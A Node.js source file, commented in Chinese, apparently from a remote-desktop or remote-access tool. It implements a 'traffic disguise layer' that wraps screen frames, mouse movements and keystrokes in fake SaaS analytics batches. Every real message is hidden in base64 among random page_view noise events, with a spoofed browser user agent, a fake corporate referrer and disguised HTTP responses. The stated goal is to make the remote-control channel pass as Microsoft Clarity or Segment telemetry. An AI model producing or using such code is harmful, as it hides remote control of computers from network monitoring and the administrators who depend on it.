/**
 * 流量伪装层 — 将远控数据包装成「企业 SaaS 遥测/analytics」报文
 *
 * 伪装目标：让 PC1 ↔ S 的 WebSocket 流量看起来像
 * Microsoft Clarity / Segment / 自建 BI 埋点上报，而非远控协议。
 */

const crypto = require('crypto');

// 事件类型映射（真实含义 → 伪装事件名）
const EVENT_MAP = {
  screen_frame: 'scroll_depth',
  mouse_move: 'mouse_move',
  mouse_click: 'click',
  mouse_down: 'mousedown',
  mouse_up: 'mouseup',
  key_down: 'keydown',
  key_up: 'keyup',
  ping: 'heartbeat',
  pong: 'heartbeat_ack',
  register: 'session_init',
  paired: 'session_ready',
  error: 'error_report',
};

const REVERSE_EVENT_MAP = Object.fromEntries(
  Object.entries(EVENT_MAP).map(([k, v]) => [v, k])
);

/** 生成看起来像正常浏览器 session 的元数据 */
function fakeMeta() {
  return {
    ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    ref: 'https://portal.corp-analytics.internal/dashboard',
    vid: crypto.randomUUID().slice(0, 8),
    plat: 'web',
  };
}

/** 填充噪声事件，使 batch 大小更接近真实埋点 */
function noiseEvents(count = 2) {
  const pages = ['/dashboard', '/reports', '/settings', '/team', '/billing'];
  const events = [];
  for (let i = 0; i < count; i++) {
    events.push({
      e: 'page_view',
      p: pages[Math.floor(Math.random() * pages.length)],
      d: Buffer.from(JSON.stringify({ t: Date.now(), r: Math.random() })).toString('base64url'),
    });
  }
  return events;
}

/**
 * 编码：真实消息 → 伪装 batch
 * @param {object} payload - { type, data, ... }
 * @param {string} sessionId
 */
function encode(payload, sessionId) {
  const disguisedType = EVENT_MAP[payload.type] || 'custom_event';
  const realData = Buffer.from(JSON.stringify(payload)).toString('base64url');

  const batch = [
    ...noiseEvents(Math.floor(Math.random() * 2) + 1),
    {
      e: disguisedType,
      p: '/remote-session',
      d: realData,
      x: Math.floor(Math.random() * 1920),
      y: Math.floor(Math.random() * 1080),
    },
    ...noiseEvents(1),
  ];

  return {
    v: 2,
    sid: sessionId,
    ts: Date.now(),
    batch,
    meta: fakeMeta(),
  };
}

/**
 * 解码：伪装 batch → 真实消息（提取含远控数据的 event）
 */
function decode(envelope) {
  if (!envelope || !Array.isArray(envelope.batch)) return null;

  for (const item of envelope.batch) {
    if (!item.d) continue;
    try {
      const raw = Buffer.from(item.d, 'base64url').toString('utf8');
      const parsed = JSON.parse(raw);
      if (parsed && parsed.type) return parsed;
    } catch {
      // 噪声事件，跳过
    }
  }
  return null;
}

/** HTTP 伪装的 REST 响应包装（用于轮询 fallback） */
function wrapHttpResponse(data) {
  return {
    status: 'ok',
    code: 200,
    data: {
      metrics: data,
      cached: true,
      ttl: 30,
    },
    requestId: crypto.randomUUID(),
  };
}

module.exports = {
  encode,
  decode,
  wrapHttpResponse,
  EVENT_MAP,
  REVERSE_EVENT_MAP,
};
